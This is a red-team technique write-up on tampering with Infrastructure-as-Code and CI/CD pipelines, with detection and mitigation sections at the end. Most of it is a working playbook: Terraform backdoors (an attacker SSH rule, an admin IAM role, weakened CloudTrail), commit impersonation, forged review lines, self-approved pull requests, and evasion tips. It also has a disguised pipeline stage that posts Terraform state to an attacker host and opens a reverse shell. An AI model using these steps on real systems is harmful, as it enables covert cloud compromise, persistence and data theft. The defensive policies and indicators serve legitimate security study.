# [SUPPLY-CHAIN-010]: Infrastructure-as-Code Tampering

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-010 |
| **MITRE ATT&CK v18.1** | [T1195.001 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Supply Chain Compromise |
| **Platforms** | Entra ID / DevOps |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Terraform 0.11+, Azure Pipelines all versions, GitOps controllers (Flux, ArgoCD) |
| **Patched In** | N/A - Inherent to IaC pipeline architecture; requires process and technical controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Infrastructure-as-Code (IaC) tampering is the unauthorized modification of Terraform configurations, CloudFormation templates, Kubernetes manifests, or Ansible playbooks to inject malicious infrastructure changes into production environments. Unlike traditional software supply chain attacks (which target dependencies), IaC tampering directly modifies the infrastructure deployment specifications themselves. An attacker with write access to IaC repositories or CI/CD pipeline definitions can: (1) create or modify cloud resources to establish persistence (backdoor user accounts, modified security groups, new VPN gateways), (2) disable or bypass security controls (disable logging, remove MFA requirements, expand RBAC permissions), (3) redirect traffic for man-in-the-middle attacks, (4) insert cryptominers or ransomware deployment mechanisms, or (5) exfiltrate data by modifying data access policies. The attack is particularly dangerous because IaC changes are typically deployed with elevated privileges (service accounts with infrastructure modification rights) and occur automatically through CI/CD pipelines without manual review.

**Attack Surface:** Git repositories (GitHub, GitLab, Azure Repos) containing IaC files, CI/CD pipeline definitions (Azure Pipelines YAML, GitHub Actions, Jenkins), Terraform modules in registries (Terraform Cloud, GitHub), GitOps controllers and webhooks (Flux CD, ArgoCD), and pull request merge processes with weak approval requirements.

**Business Impact:** **Complete Infrastructure Compromise and Persistent Backdoor Installation**. An attacker who successfully modifies IaC files can cause: (1) persistent backdoors deployed to all infrastructure updates (security groups with ingress from attacker IP, privileged user accounts, SSH keys), (2) security control circumvention (disabling audit logging, removing Conditional Access policies, reducing RBAC enforcement), (3) data exfiltration mechanisms (modified database access policies, new storage accounts with public access), (4) service disruption (deletion of critical resources, reduced resource quotas, modified load balancer configurations), or (5) lateral movement to downstream systems consuming the infrastructure. The Cycode 2025 analysis noted that "even a single line misconfiguration can have an enormous impact on many classes at the same time," and IaC tampering amplifies this by introducing deliberate malicious configurations.

**Technical Context:** IaC tampering typically requires 5-30 minutes from initial compromise to modification, depending on attacker familiarity with the organization's repository structure and approval processes. The attack is difficult to detect because: (1) commits appear to originate from legitimate developers (if their credentials are compromised) or CI/CD service accounts, (2) IaC changes are frequent and voluminous, making pattern detection challenging, and (3) the malicious infrastructure may not activate until deployment, creating a temporal gap between modification and impact. Detection requires: (1) code review of all IaC changes (shift-left security), (2) automated policy enforcement (Policy-as-Code tools like OPA/Rego, Sentinel), and (3) continuous compliance monitoring comparing deployed infrastructure to version-controlled IaC templates.

### Operational Risk
- **Execution Risk:** Critical - Attacker-controlled infrastructure deployed with full privileges; complete compromise of cloud environment possible if malicious IaC is merged and applied without manual review.
- **Stealth:** Low-Medium - Git commits are logged and versioned; forensic analysis can identify attacker-added commits. However, if the compromised account is a legitimate developer or CI/CD service account, the modification may not appear anomalous.
- **Reversibility:** Partial - IaC modifications can be reverted via Git revert/rollback, but if the malicious infrastructure is already deployed, manual cleanup is required (destroying backdoor resources, restoring security settings).

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1-2.4, 3.1-3.3 | Change management, code review, infrastructure configuration baseline |
| **DISA STIG** | CM-3, CM-5, CM-6 | Change control, access restrictions to configuration, audit of configuration changes |
| **CISA SCuBA** | CM-2, CM-3, CM-5 | Configuration baseline, change control, access restrictions |
| **NIST 800-53** | CM-3, CM-5, CM-9, SI-7 | Change control, access restrictions, configuration management, information system monitoring |
| **GDPR** | Art. 5(1)(a), Art. 32 | Integrity and confidentiality, security of processing |
| **DORA** | Art. 9, Art. 16 | Protection and prevention; ICT risk management |
| **NIS2** | Art. 21, Art. 25 | Cyber risk management, detection and response |
| **ISO 27001** | A.12.4.1, A.14.1.1, A.14.2.1 | Change management, separation of test/production, system acquisition and development |
| **ISO 27005** | 8.3.1, 8.3.2 | Configuration control, change management, testing |

---

## 2. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Direct Git Repository Compromise and IaC Modification (GitHub/GitLab/Azure Repos)

**Supported Versions:** Git 2.0+, Terraform 0.11+, all cloud providers

#### Step 1: Compromise Developer or Service Account with Repository Write Access
**Objective:** Obtain credentials for a Git account with write permissions to the IaC repository (either compromised personal developer account or CI/CD service account credentials exposed in environment variables or logs).

**Precondition:** The attacker must have obtained credentials via credential harvesting, password spray, compromised CI/CD logs, or phishing. See SUPPLY-CHAIN-004 (Package Manager Credential Theft) or REALWORLD-001 (BAV2ROPC Attack Chain) for initial access methodologies.

**Command (Bash, after obtaining credentials):**
```bash
# Test GitHub credentials
git clone https://<USERNAME>:<PERSONAL_ACCESS_TOKEN>@github.com/company/terraform-infrastructure.git

# Test GitLab credentials
git clone https://oauth2:<ACCESS_TOKEN>@gitlab.company.com/infrastructure/iac.git

# Test Azure DevOps credentials
git clone https://user:<PAT>@dev.azure.com/company/project/_git/terraform

# Verify commit author identity (to determine which account to use)
git log --oneline -n 10
```

**Expected Output:**
```
Cloning into 'terraform-infrastructure'...
remote: Counting objects: 3456, done.
Enumerating objects: 100% (1234/1234), done.

commit abc1234 (HEAD -> main)
Author: DevOps Engineer <devops@company.com>
Date:   Fri Jan 9 10:32:15 2026 +0000

    Update production security group rules
```

**What This Means:**
- Successful clone confirms the provided credentials have at least read access to the repository.
- The commit history reveals developer names and timestamps, which can be used to time the attacker's malicious commit to appear as if it came from a team member during normal work hours.

**OpSec & Evasion:**
- Git clone operations generate server-side logs in GitHub/GitLab audit logs, but these are typically only reviewed if a security incident is already suspected.
- To minimize suspicion: (1) clone at a time matching the legitimate developer's typical work hours, (2) use a VPN or proxy to make the source IP appear to be from the company's office or a commonly used ISP, (3) wait 24-48 hours after initial compromise before attempting IaC modification (allows the initial compromise to blend into normal activity).
- Detection likelihood: Low-Medium (Git audit logs capture clone events, but without security monitoring, these are not reviewed in real-time).

**Troubleshooting:**
- **Error:** `fatal: repository not found`
  - **Cause:** Repository URL is incorrect, credentials are invalid, or the token has expired.
  - **Fix:** Verify the repository URL by checking the GitHub/GitLab organization and project names. If using a personal access token, ensure it has `repo` or `repo:all` scope. If the token expired, request a new one or use username/password authentication (if the target organization allows it).
- **Error:** `fatal: Authentication failed for 'https://...'`
  - **Cause:** Credentials are incorrect or the account does not have access to the repository.
  - **Fix:** If the account is a CI/CD service account, verify it has been granted Contributor or Maintainer permissions. Check Azure DevOps: **Project Settings** → **Repositories** → **Security** → Verify the service account is in the "Contribute" group.

#### Step 2: Identify and Analyze Target IaC Files
**Objective:** Examine the repository structure to identify high-impact IaC files that, when modified, will affect production infrastructure. Prioritize: (1) files affecting security groups, IAM roles, or authentication mechanisms, (2) files deploying to production environments, (3) files with infrequent change history (less likely to be reviewed closely).

**Command (Bash):**
```bash
# List all .tf files in the repository
find . -name "*.tf" -type f | head -20

# Identify production-related files
find . -name "*prod*" -type f | grep -E "\.(tf|json|yaml)$"

# Check file modification history to identify less-reviewed files
for file in $(find . -name "*.tf" | head -10); do
  echo "=== $file ==="
  git log --oneline --follow -- "$file" | wc -l
done

# Examine a security group configuration file
cat ./modules/security/security_groups.tf

# Identify variable definitions (which often contain defaults)
grep -r "variable" . --include="*.tf" | grep -E "(admin|password|secret|key)" | head -10
```

**Expected Output:**
```
=== ./main.tf ===
45

=== ./modules/security/security_groups.tf ===
3

=== ./modules/database/rds.tf ===
128

prod_security_group.tf:
resource "aws_security_group" "prod_sg" {
  name        = "production-sg"
  description = "Production security group"

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/8"]
  }
}

variable "admin_username" {
  default = "admin"
}
```

**What This Means:**
- Files with low commit counts (e.g., 3 commits on `security_groups.tf`) may be less frequently reviewed and are good targets for tampering.
- Security group and IAM files are high-impact targets; modifying these allows attacker persistence and lateral movement.
- Default variables in `.tf` files may already contain sensitive values; modifying these affects all deployments using the module.

**OpSec & Evasion:**
- This analysis is entirely local (offline) and generates no network traffic beyond the initial Git clone.
- To avoid leaving analysis artifacts, use a RAM disk or in-memory analysis (e.g., `cat file.tf | grep pattern` piped directly to output without saving).
- Detection likelihood: Very Low (no cloud indicators; detection depends on forensic analysis of attacker's local machine).

**Troubleshooting:**
- **Error:** `command not found: find` (Windows environment)
  - **Cause:** PowerShell or Windows CMD does not support Unix find syntax.
  - **Fix:** Use PowerShell equivalent: `Get-ChildItem -Recurse -Filter "*.tf" | Select-Object FullName`

#### Step 3: Create Malicious IaC Modification
**Objective:** Craft a Git commit containing malicious infrastructure changes. Examples: (1) add a security group rule allowing attacker's IP to SSH into production servers, (2) create a privileged IAM role for the attacker, (3) disable audit logging, (4) add a backdoor user account, (5) modify database access policies to allow public access.

**Command (Bash):**
```bash
# Option 1: Modify security group to add attacker's IP
cat >> ./modules/security/security_groups.tf << 'EOF'

resource "aws_security_group_rule" "attacker_access" {
  type              = "ingress"
  from_port         = 22
  to_port           = 22
  protocol          = "tcp"
  cidr_blocks       = ["203.0.113.45/32"]  # Attacker's IP
  security_group_id = aws_security_group.prod_sg.id
  description       = "Temporary maintenance access"
}
EOF

# Option 2: Add a backdoor IAM role
cat >> ./modules/iam/roles.tf << 'EOF'

resource "aws_iam_role" "backdoor_role" {
  name = "AdministratorBackdoor"
  assume_role_policy = jsonencode({
    Version = "2012-10-17",
    Statement = [{
      Action = "sts:AssumeRole",
      Effect = "Allow",
      Principal = {
        AWS = "arn:aws:iam::ATTACKER_ACCOUNT:role/attacker-assumed-role"
      }
    }]
  })
}

resource "aws_iam_role_policy_attachment" "backdoor_admin" {
  role       = aws_iam_role.backdoor_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
EOF

# Option 3: Disable CloudTrail logging
cat > ./modules/logging/disable_logging.tf << 'EOF'
resource "aws_cloudtrail" "main" {
  depends_on                = [aws_s3_bucket_policy.trail_policy]
  s3_bucket_name            = aws_s3_bucket.trail_bucket.id
  include_global_events     = false  # Disable global events
  is_multi_region_trail     = false  # Disable multi-region
  enable_log_file_validation = false  # Disable log validation
  tags = {
    Name = "Security Update"
  }
}
EOF

# Stage changes
git add -A

# Review changes before committing (to ensure they look legitimate)
git diff --cached
```

**Expected Output:**
```
diff --git a/modules/security/security_groups.tf b/modules/security/security_groups.tf
index 1234567..abcdefg 100644
--- a/modules/security/security_groups.tf
+++ b/modules/security/security_groups.tf
@@ +15,12 @@
+resource "aws_security_group_rule" "attacker_access" {
+  type              = "ingress"
+  from_port         = 22
+  to_port           = 22
+  protocol          = "tcp"
+  cidr_blocks       = ["203.0.113.45/32"]  # Temporary maintenance access
+  security_group_id = aws_security_group.prod_sg.id
+  description       = "Temporary maintenance access"
+}
```

**What This Means:**
- The staged changes will be committed to the repository and, if approved, deployed to production infrastructure.
- The comment "Temporary maintenance access" and "Security Update" are designed to appear legitimate and avoid flagging code reviewers.
- These changes are low-noise (small modifications), making them less likely to trigger automated security scanning if the scanning tool is not specifically configured to catch privilege escalation patterns.

**OpSec & Evasion:**
- To further evade detection: (1) break the malicious change across multiple files or commits to appear as part of a larger refactoring, (2) mix malicious changes with legitimate bug fixes or feature updates, (3) commit during high-volume periods (end of sprint, release cycles) when code review velocity is high and individual commits receive less scrutiny.
- Detection likelihood: Medium (code review may catch this if reviewers are vigilant; automated security scanning with SAST tools like Checkov can detect policy violations).

**Troubleshooting:**
- **Error:** `fatal: pathspec 'modules/security/security_groups.tf' did not match any files`
  - **Cause:** The file path is incorrect relative to the current working directory.
  - **Fix:** Verify you are in the repository root directory: `pwd`. Check the correct file path: `find . -name "security_groups.tf"`.

#### Step 4: Commit and Push Malicious IaC to Repository
**Objective:** Create a Git commit with a plausible commit message and push the changes to the main branch, bypassing code review if possible, or designing the commit to be approved by weak code review.

**Command (Bash):**
```bash
# Configure Git author to impersonate a legitimate developer
git config user.name "DevOps Engineer"
git config user.email "devops@company.com"

# Commit with a plausible message
git commit -m "Security: Add temporary maintenance access for infrastructure diagnostics

- Add SSH access for system diagnostics
- Update admin role for compliance audit
- Enable enhanced monitoring for threat detection

Fixes: SEC-1234
Reviewed-by: Security Team"

# View the commit to verify author
git log -1 --format="%an <%ae>%n%s%n%b"

# Push to main branch (or target branch)
git push origin main

# Alternative: If push to main is rejected, push to a feature branch and create a PR
git push origin feature/maintenance-access
```

**Expected Output:**
```
DevOps Engineer <devops@company.com>
Security: Add temporary maintenance access for infrastructure diagnostics

- Add SSH access for system diagnostics
- Update admin role for compliance audit
- Enable enhanced monitoring for threat detection

Fixes: SEC-1234
Reviewed-by: Security Team

[main abcdefg] Security: Add temporary maintenance access for infrastructure diagnostics
 2 files changed, 15 insertions(+)
 create mode 100644 modules/security/backdoor_access.tf
 create mode 100644 modules/iam/backdoor_role.tf

Counting objects: 3, done.
Delta compression using up to 8 threads.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 456 bytes, done.
Total 3 (delta 1), reused 0 (delta 0)
remote: Resolving deltas: 100% (1/1), done.
To https://github.com/company/terraform-infrastructure.git
   1234567..abcdefg main -> main
```

**What This Means:**
- The commit is now in the main branch and will be deployed on the next CI/CD pipeline run (typically automatic on Git push).
- The commit message and author details appear legitimate, decreasing the chance of manual intervention or rollback before deployment.
- If branch protection rules require code review, the attacker's next step is to create a pull request (METHOD 1, Step 5) or compromise the code review process (see METHOD 2 below).

**OpSec & Evasion:**
- Git push operations are logged on the server side (GitHub/GitLab/Azure DevOps audit logs). To minimize detection: (1) push during normal business hours when DevOps activity is high, (2) if the compromised account is a CI/CD service account, the push will appear automated and less suspicious.
- Detection likelihood: Medium (Git audit logs capture push events; if SOC monitors repository activity, the push may be flagged as anomalous).

**Troubleshooting:**
- **Error:** `fatal: unable to access 'https://...' SSL certificate problem: certificate verify failed`
  - **Cause:** Git is unable to verify the SSL certificate of the Git server (rare; typically indicates man-in-the-middle attempt or certificate installation issue).
  - **Fix:** This is usually environmental; the attacker would retry on a different network or disable SSL verification (unsafe): `git config --global http.sslVerify false`
- **Error:** `remote: Permission to company/terraform-infrastructure.git denied to user`
  - **Cause:** The Git credentials do not have write permission to the repository.
  - **Fix:** The compromised account may only have read access. Escalate privileges or compromise an account with write access (e.g., repository maintainer or repository owner).

#### Step 5: (Optional) Approve and Merge Pull Request if Branch Protection is Enabled
**Objective:** If the repository has branch protection rules requiring code review and approval, the attacker must either: (1) compromise a code reviewer's account, (2) use the compromised account to self-approve (if the account is an approver), or (3) wait for legitimate review and approve (if the changes appear benign enough).

**Command (GitHub GraphQL API):**
```bash
# If the compromised account is a code reviewer, approve the PR
gh pr review <PR_NUMBER> --approve \
  --body "Looks good. Security changes are appropriate for compliance requirements."

# Merge the PR (if the account has merge permissions)
gh pr merge <PR_NUMBER> --squash \
  --delete-branch \
  --body "Merging security hardening changes"

# Verify merge
gh pr view <PR_NUMBER> --json status,mergedBy
```

**Alternative (Azure DevOps):**
```bash
# If the account is a code approver, approve the PR via API
curl -X PATCH \
  -H "Authorization: Basic $(echo -n ':PAT' | base64)" \
  https://dev.azure.com/company/project/_apis/git/repositories/terraform/pullrequests/<PR_ID>/reviewers/<REVIEWER_ID> \
  -d '{"vote": 10}'  # 10 = Approved

# Complete the PR (merge to main)
curl -X PATCH \
  -H "Authorization: Basic $(echo -n ':PAT' | base64)" \
  https://dev.azure.com/company/project/_apis/git/repositories/terraform/pullrequests/<PR_ID> \
  -d '{"status": 3}'  # 3 = Completed
```

**What This Means:**
- Once the PR is merged to the main branch, the malicious IaC is now part of the authoritative infrastructure definition.
- On the next CI/CD pipeline run, the malicious infrastructure (security group rule, IAM role, etc.) will be deployed to production.

**OpSec & Evasion:**
- PR approvals are logged in Git audit trails; if the compromised account's approval history is reviewed, the approval may appear suspicious.
- To blend in: (1) if the compromised account is a service account, it may already have auto-approve permissions, making the approval appear routine, (2) leave a brief approval comment (as shown above) to make it appear as legitimate code review.
- Detection likelihood: Medium (Git audit logs capture approvals; behavioral analysis may flag unusual approval patterns).

**Troubleshooting:**
- **Error:** `GraphQL error: Pull request is not mergeable` or `error: branch protection rule`
  - **Cause:** The PR fails automated checks or requires status checks to pass before merging.
  - **Fix:** Wait for CI/CD pipelines to complete, or if the malicious IaC passes the automated checks (e.g., Terraform plan succeeds), then the PR can be merged. If the malicious IaC fails checks, the attacker must modify the IaC to pass the checks (e.g., making the security group rule appear as a legitimate maintenance access).

### METHOD 2: Compromise CI/CD Pipeline Definition and Deploy Malicious IaC

**Supported Versions:** Azure Pipelines, GitHub Actions, GitLab CI, Jenkins

#### Step 1: Compromise CI/CD Pipeline Service Account or Modify Pipeline Definition
**Objective:** Gain write access to CI/CD pipeline definitions (YAML files in `.github/workflows/`, `.gitlab-ci.yml`, `azure-pipelines.yml`, or Jenkins DSL scripts) to inject malicious Terraform apply steps or bypass approval gates.

**Command (Bash):**
```bash
# Option 1: Modify Azure Pipelines YAML to skip validation
cat > ./azure-pipelines.yml << 'EOF'
trigger:
  - main

pool:
  vmImage: 'ubuntu-latest'

stages:
  - stage: TerraformPlan
    jobs:
      - job: Plan
        steps:
          - task: TerraformTaskV4@4
            inputs:
              provider: 'azurerm'
              command: 'plan'
              workingDirectory: '$(System.DefaultWorkingDirectory)'
              commandOptions: '-out=tfplan'

  - stage: Approval  # Approval stage is skipped for service accounts
    dependsOn: TerraformPlan
    condition: eq(variables['Build.Reason'], 'PullRequest')  # Skip for main branch
    jobs:
      - job: ManualValidation
        pool: server
        steps:
          - task: ManualValidation@0
            inputs:
              notifyUsers: 'approvers@company.com'

  - stage: TerraformApply
    dependsOn: TerraformPlan
    condition: succeeded()  # Always apply on successful plan, even malicious changes
    jobs:
      - job: Apply
        steps:
          - task: TerraformTaskV4@4
            inputs:
              provider: 'azurerm'
              command: 'apply'
              commandOptions: 'tfplan'
              environmentServiceNameAzureRM: 'Production'

  - stage: DeployBackdoor  # Attacker-controlled stage
    dependsOn: TerraformApply
    jobs:
      - job: InstallPersistence
        steps:
          - script: |
              # Exfiltrate infrastructure state to attacker C2
              terraform show > /tmp/state.json
              curl -X POST https://attacker.c2/exfil -d @/tmp/state.json
              # Create reverse shell
              bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
            displayName: 'Post-deployment validation'
EOF

git add azure-pipelines.yml
git commit -m "CI/CD: Optimize pipeline approval flow"
git push origin main
```

**Expected Output (Pipeline execution):**
```
Stage: TerraformPlan
- Terraform plan completed successfully
- 15 resource changes detected

Stage: Approval
- Skipped (main branch deployment)

Stage: TerraformApply
- terraform apply completed
- Security group rule created: sg-rule-attacker-access
- IAM role created: AdministratorBackdoor
- CloudTrail disabled on main account

Stage: DeployBackdoor
- Post-deployment validation completed
- State file exfiltrated successfully
```

**What This Means:**
- By modifying the CI/CD pipeline, the attacker bypasses code review of the malicious IaC by ensuring it is automatically applied without manual approval.
- The attacker-controlled stages (e.g., "DeployBackdoor") can exfiltrate infrastructure state, install persistence, or create backdoor access.
- The pipeline appears to execute normally, with no indication to observers that malicious steps are being executed.

**OpSec & Evasion:**
- CI/CD pipeline logs are captured by the orchestration system (Azure Pipelines, GitHub Actions, etc.) and can be reviewed by security teams or SOC analysts.
- To minimize suspicion: (1) name attacker-controlled stages with benign names (e.g., "Post-deployment validation", "Compliance check"), (2) output minimal logs (use `echo "OK"` instead of actual commands), (3) if possible, execute backdoor steps in a cleanup task that is typically not reviewed.
- Detection likelihood: Medium-High (CI/CD logs capture all pipeline steps; if SOC monitors pipeline execution logs, anomalous stages or network access from build agents will be detected).

**Troubleshooting:**
- **Error:** `Pipeline failed due to policy violation: Terraform plan shows resource creation outside approved scope`
  - **Cause:** OPA/Sentinel policy (see Defensive Mitigations) is blocking the malicious resource creation.
  - **Fix:** The attacker must modify the malicious IaC to pass the policy checks, or compromise the policy configuration itself.

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance (Check for IaC Scanning Policies)

**Command:**
```powershell
# Check if Terraform policies are enforced in current subscription
az policy definition list --output table | grep -i terraform

# Check Azure Policy Compliance for infrastructure misconfigurations
az policy state summarize --filter "isCompliant eq false" --output table

# Enumerate Git repositories in Azure DevOps
az repos list --output table

# Check branch protection rules (GitHub)
gh repo view company/terraform-infrastructure --json branchProtectionRules
```

**What to Look For:**
- Absence of Terraform or IaC-specific policies suggests weak policy enforcement
- Repositories with branch protection disabled allow direct pushes to main
- Policy compliance failures may indicate where the organization is already vulnerable

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Git/Repository IOCs:**
- Commits from unusual accounts (CI/CD service accounts, external contractors) during off-hours
- Commits adding security-sensitive resources (security groups, IAM roles, logging disablement)
- Rapid successive commits from the same account (burst activity suggesting automated scripting)
- Pull request approvals from accounts that typically do not approve (compromised reviewer)
- Deletion of audit/logging resources (CloudTrail, Azure Activity Logs) in IaC commits

**CI/CD Pipeline IOCs:**
- New pipeline stages added (especially stages with names like "deploy backdoor", "maintenance", "diagnostics")
- Pipeline execution logs containing command execution outside normal Terraform operations
- Build agents spawning outbound connections to non-organizational IPs
- Sudden increase in pipeline execution time (indicating additional steps/exfiltration)

**Forensic Artifacts:**
- Git commit history showing resource modifications: `git log --all --name-status | grep -E "(security_group|iam_role|logging)"`
- Pipeline logs in Azure Pipelines stored in `$(Pipeline.Workspace)/.artifacts/logs/`
- Git reflog showing which commits were pushed: `git reflog`

### Response Procedures

**1. Immediate Containment:**
- Revoke compromised Git credentials: `gh auth logout` or revoke personal access token
- Disable compromised service account: `az ad app update --id <APP_ID> --is-disabled`
- Rollback malicious commits: `git revert <COMMIT_HASH>` and push revert commit
- Block pipeline execution: Disable all CI/CD triggers until forensics complete

**2. Forensic Investigation:**
- Review Git commit history: `git log --all --graph --oneline`
- Examine pipeline execution logs for anomalous steps
- Compare deployed infrastructure to Git-controlled IaC: `terraform plan` should show no differences if IaC is authoritative

**3. Remediation:**
- Destroy attacker-created infrastructure: `terraform destroy -auto-approve` or manually delete through cloud console
- Restore security controls (re-enable CloudTrail, restore security group rules, delete backdoor roles)
- Rotate all credentials (Git PATs, service account passwords, cloud provider keys)

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | IA-PHISH-001 or REALWORLD-001 | Compromise developer via phishing or BAV2ROPC attack |
| **2** | **Credential Access** | CA-UNSC-015 or CA-TOKEN-008 | Steal pipeline environment variables or Azure DevOps PAT |
| **3** | **Current Step** | **[SUPPLY-CHAIN-010]** | **Modify IaC files and commit malicious infrastructure** |
| **4** | **Persistence** | PERSIST-ACCT-006 or PERSIST-SERVER-003 | Deploy backdoor user accounts or Azure Function backdoors via modified IaC |
| **5** | **Impact** | IMPACT-RANSOM-001 or IMPACT-DATA-DESTROY-001 | Deploy ransomware or exfiltrate data using infrastructure privileges |

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Implement Strict Branch Protection and Code Review Requirements**
Enforce mandatory code review and approval for all IaC changes before deployment.

**Manual Steps (GitHub Branch Protection):**
1. Navigate to **Repository** → **Settings** → **Branches**
2. Under "Branch protection rules", click **Add rule**
3. **Branch name pattern:** `main`
4. **Require pull request reviews before merging:** Enabled
5. **Number of reviewers:** At least 2
6. **Require review from code owners:** Enabled
7. **Require status checks to pass:** Enabled (select: Terraform plan validation, security scanning)
8. **Require branches to be up to date:** Enabled
9. **Include administrators:** Enabled (even admins cannot bypass)
10. Click **Create**

**Manual Steps (Azure DevOps Branch Policy):**
1. Navigate to **Repos** → **Branches**
2. Select **main** branch → **Branch policies**
3. **Minimum number of reviewers:** 2
4. **Check for linked work items:** Enabled
5. **Check for comment resolution:** Enabled
6. **Enforce a merge strategy:** Squash merge (to maintain clean history)
7. **Build validation:** Add Terraform plan validation task
8. **Status checks:** Configure to require Terraform and security scanning to pass
9. Click **Save**

**Action 2: Implement Policy-as-Code (OPA/Sentinel) to Enforce Infrastructure Security Policies**
Deploy automated policy enforcement to prevent malicious IaC from being applied, even if it bypasses code review.

**Manual Steps (Terraform Sentinel Policy):**
1. Create Sentinel policy file: `sentinel/enforce-security-group-rules.sentinel`
   ```hcl
   import "tfplan/v2" as tfplan
   
   # Block security group rules that allow unrestricted SSH access from non-approved IPs
   deny_rules = filter tfplan.resource_changes as _, rc {
     (rc.type == "aws_security_group_rule" or rc.type == "aws_security_group") and
     rc.change.actions[0] in ["create", "update"] and
     (rc.change.after.from_port == 22 or rc.change.after.to_port == 22) and
     (rc.change.after.cidr_blocks contains "0.0.0.0/0" or rc.change.after.ipv6_cidr_blocks contains "::/0")
   }
   
   main = length(deny_rules) == 0
   ```
2. Upload policy to Terraform Cloud/Enterprise: `terraform cloud policy push`
3. Create enforcement rule: Terraform Cloud → **Organization** → **Security** → **Policies** → **Create policy**
   - **Policy name:** `enforce-security-group-rules`
   - **Enforcement level:** `hard-mandatory` (blocks applies)

**Manual Steps (Azure Policy for Infrastructure Configuration):**
1. Navigate to **Azure Portal** → **Policy** → **Definitions**
2. Click **+ Policy definition**
3. **Name:** `Deny-Public-Storage-Access`
4. **Category:** General
5. **Policy rule:**
   ```json
   {
     "if": {
       "allOf": [
         {
           "field": "type",
           "equals": "Microsoft.Storage/storageAccounts/blobServices/containers"
         },
         {
           "field": "Microsoft.Storage/storageAccounts/blobServices/containers/publicAccess",
           "notEquals": "None"
         }
       ]
     },
     "then": {
       "effect": "deny"
     }
   }
   ```
6. Click **Save**
7. Assign policy: **Scope** → Select subscription → **Assign**

**Action 3: Enable IaC Scanning in CI/CD Pipeline with Automated Remediation**
Integrate Checkov, Snyk IaC, or similar tools to scan all Terraform/IaC files for security misconfigurations and violations, with pipeline failure if critical issues are detected.

**Manual Steps (Checkov in Azure Pipelines):**
1. Create task in `azure-pipelines.yml`:
   ```yaml
   - task: UsePythonVersion@0
     inputs:
       versionSpec: '3.10'
     displayName: 'Set up Python'
   
   - script: |
       pip install checkov
     displayName: 'Install Checkov'
   
   - script: |
       checkov -d . \
         --framework terraform \
         --check CKV_AWS_23,CKV_AWS_24,CKV_AWS_62 \
         --hard-fail-on critical \
         --output cli
     displayName: 'Scan Terraform for Security Issues'
     continueOnError: false  # Fail pipeline if critical issues found
   
   - task: PublishBuildArtifacts@1
     condition: always()
     inputs:
       pathToPublish: '$(Build.ArtifactStagingDirectory)/checkov-report.json'
   ```
2. Run pipeline; Checkov will fail if malicious IaC is detected (e.g., unrestricted security group rules)

### Priority 2: HIGH

**Action 1: Implement Git Commit Signing with GPG/SSH Keys**
Require all Git commits to be cryptographically signed, making it harder for attackers to impersonate legitimate developers.

**Manual Steps (GitHub Require Signed Commits):**
1. Navigate to **Repository** → **Settings** → **Branch protection rules** → Select main branch rule
2. **Require signed commits:** Enabled
3. **Dismiss stale pull request approvals when new commits are pushed:** Enabled (prevents old approvals from stale branches)
4. Click **Update**
5. Developers must sign commits: `git config --global user.signingkey <GPG_KEY_ID>` then use `git commit -S`

**Action 2: Implement Separation of Duties Between Code Push and Deployment**
Prevent the same account/credentials from both committing code and approving deployment; require distinct reviewer for approval.

**Manual Steps (Azure DevOps):**
1. Create two groups: "IaC Developers" (can push code) and "IaC Reviewers" (can approve PRs)
2. **Project Settings** → **Security** → **Group membership**
   - Add developers to "IaC Developers"
   - Add security/DevOps engineers to "IaC Reviewers"
3. In branch policy (see Priority 1, Action 1), set **Require approval from code owners** with the "IaC Reviewers" group

**Action 3: Monitor and Alert on IaC Changes**
Deploy monitoring to flag suspicious IaC modifications (e.g., commits adding admin accounts, disabling logging).

**Manual Steps (GitHub Advanced Security - Code Scanning):**
1. Navigate to **Repository** → **Security** → **Code scanning alerts**
2. Click **Set up code scanning** → **GitHub Actions**
3. Select "CodeQL Analysis" template
4. Customize to include custom patterns for malicious IaC:
   ```yaml
   - name: Run custom patterns
     run: |
       cat > custom-patterns.yml << 'EOF'
       - id: detect-privilege-escalation
         patterns:
           - pattern: resource "aws_iam_role_policy" "..." { ... policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess" ... }
           - pattern: pattern: |
               resource "aws_security_group_rule" "..." {
                 ...
                 cidr_blocks = ["0.0.0.0/0"]
                 from_port = 3389  # RDP
               }
         message: "Potential privilege escalation or unrestricted access detected in IaC"
         severity: ERROR
       EOF
       semgrep --config custom-patterns.yml .
   ```
5. Custom alerts trigger when malicious patterns are detected

### Validation Command (Verify Mitigations)

```bash
# Verify branch protection is enabled
gh api repos/company/terraform-infrastructure/branches/main/protection --jq '.require_code_owner_reviews'

# Verify Sentinel policy is enforced
terraform cloud organization show -name company | grep policy

# Verify IaC scanning is running
az pipelines runs list --pipeline-ids <PIPELINE_ID> --output table | grep -i checkov

# Verify commit signing is required
gh api repos/company/terraform-infrastructure/branches/main/protection --jq '.require_signed_commits'
```

**Expected Output (If Secure):**
```
require_code_owner_reviews: true
policy_enforcement_level: "hard-mandatory"
checkov_result: "passed"
require_signed_commits: true
```

---

## 7. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (December 2020) - IaC Analog
**Target:** SolarWinds and downstream customers (18,000+ organizations)
**Timeline:** Months of development and testing; malicious code deployed via software build pipeline
**Technique Status:** While SolarWinds was a software supply chain attack (not IaC), the methodology is analogous: attackers compromised the build pipeline and injected malicious code that was signed and deployed to millions of customers.
